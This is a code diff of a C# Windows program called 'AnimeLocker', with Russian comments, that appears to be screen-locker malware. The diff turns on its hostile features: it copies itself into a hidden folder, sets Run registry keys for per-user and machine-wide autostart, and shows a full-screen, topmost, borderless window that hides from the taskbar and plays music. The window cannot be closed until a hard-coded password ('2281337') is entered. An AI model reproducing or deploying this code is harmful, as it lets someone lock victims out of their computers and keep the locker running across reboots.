@@ -66,11 +66,10 @@ namespace Locker
         }
         SoundPlayer Sound;
         Thread locker_thread;
-        int i = 0, k = 0, j;
+        int k = 0, j;
         public Form1()
         {
             InitializeComponent();
-            #region defining
             //Создание копии в скрытой папке
             string targetPath = @"C:\Users\CheAnime\";
             Directory.CreateDirectory(targetPath);
@@ -82,9 +81,9 @@ namespace Locker
             {
                 System.IO.File.Copy(sourceFile, destFile, true);
             }
-            //test
+            //Добавление копии в автозапуск
             string name = "AnimeLocker";
-            string ExePath = System.Windows.Forms.Application.ExecutablePath;
+            string ExePath = destFile;
             Microsoft.Win32.RegistryKey reg;
             reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");
             try
@@ -93,53 +92,56 @@ namespace Locker
                 reg.Close();
             }
             catch (Exception ex) { MessageBox.Show(ex.Message); }
-            /* //Добавление копии в автозапуск
-             string name = "AnimeLocker";
-             string ExePath = "\"" + destFile + "\"";
-             Microsoft.Win32.RegistryKey reg;
-             reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");
-             try
-             {
-                 reg.SetValue(name, ExePath);
-                 reg.Close();
-             }
-             catch (Exception ex) { MessageBox.Show(ex.Message); } */
-            //Начинка
-            this.MaximizeBox = false;
-            this.MinimizeBox = false;
-            this.ControlBox = false;
-            //this.WindowState = FormWindowState.Maximized;
-            //this.TopMost = true;
-            this.ShowInTaskbar = false;
-            this.FormBorderStyle = FormBorderStyle.None;
-            this.Move += delegate { this.Capture = false; };
-            //Sound.PlayLooping();
-            #endregion
+            reg = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\");
+            try
+            {
+                reg.SetValue(name, ExePath);
+                reg.Close();
+            }
+            catch (Exception ex) { MessageBox.Show(ex.Message); }
+            //Потоки музыки и картинок
             Sound = new SoundPlayer(Properties.Resources.Music);
+            Sound.PlayLooping();
             locker_thread = new Thread(LockIn);
             locker_thread.Start();
         }
-        
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            //Настройки формы
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.ControlBox = false;
+            this.WindowState = FormWindowState.Maximized;
+            this.TopMost = true;
+            this.ShowInTaskbar = false;
+            this.FormBorderStyle = FormBorderStyle.None;
+            this.Move += delegate { this.Capture = false; };
+        }
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-            //if (k == 0) e.Cancel = true;
+            if (k == 0) e.Cancel = true;
         }
         private void Form1_FormClosed(object sender, FormClosedEventArgs e)
         {
-            //Sound.Stop();
+            Sound.Stop();
             locker_thread.Abort();           
         }
         private void button1_Click(object sender, EventArgs e)
         {
-            if (textBox1.Text == "123") { exitbutton.Visible = true; k = 1; }
+            if (textBox1.Text == "2281337") { exitbutton.Visible = true; k = 1; }
         }
         private void exitbutton_Click(object sender, EventArgs e)
         {
-
-            #region Undefining
             //Удаление из автозапуска
             Microsoft.Win32.RegistryKey reg;
             reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");
+            try
+            {
+                reg.DeleteValue("AnimeLocker");
+                reg.Close();
+            }
+            catch { }
+            reg = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\");
             try
             {
                 reg.DeleteValue("AnimeLocker");
@@ -150,7 +152,6 @@ namespace Locker
             string targetPath = @"C:\Users\CheAnime\";
             DirectoryInfo dir = new DirectoryInfo(targetPath);
             dir.Delete(true);
-            #endregion
 
             Program.Allow_exit = true;
             this.Close();
